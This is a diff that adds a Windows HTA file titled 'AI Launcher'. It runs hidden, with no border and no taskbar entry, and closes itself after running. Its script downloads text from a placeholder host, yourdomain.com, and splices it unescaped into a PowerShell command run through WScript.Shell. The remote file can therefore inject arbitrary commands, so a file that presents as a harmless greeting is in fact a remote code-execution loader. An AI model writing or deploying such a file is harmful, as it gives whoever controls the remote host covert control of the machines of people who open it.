@@ -1,0 +1,31 @@
+<html>
+<head>
+  <title>AI Launcher</title>
+  <HTA:APPLICATION 
+    APPLICATIONNAME="AI"
+    BORDER="none"
+    SHOWINTASKBAR="no"
+  />
+</head>
+
+<script>
+  try {
+    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+    xhr.open("GET", "https://yourdomain.com/message.txt", false);
+    xhr.send();
+
+    var msg = xhr.responseText || "Hi I am AI";
+
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run('powershell -NoExit -Command "Write-Host \'' + msg + '\'"');
+
+  } catch (e) {
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run('powershell -NoExit -Command "Write-Host \'Hi I am AI\'"');
+  }
+
+  window.close();
+</script>
+
+<body></body>
+</html>
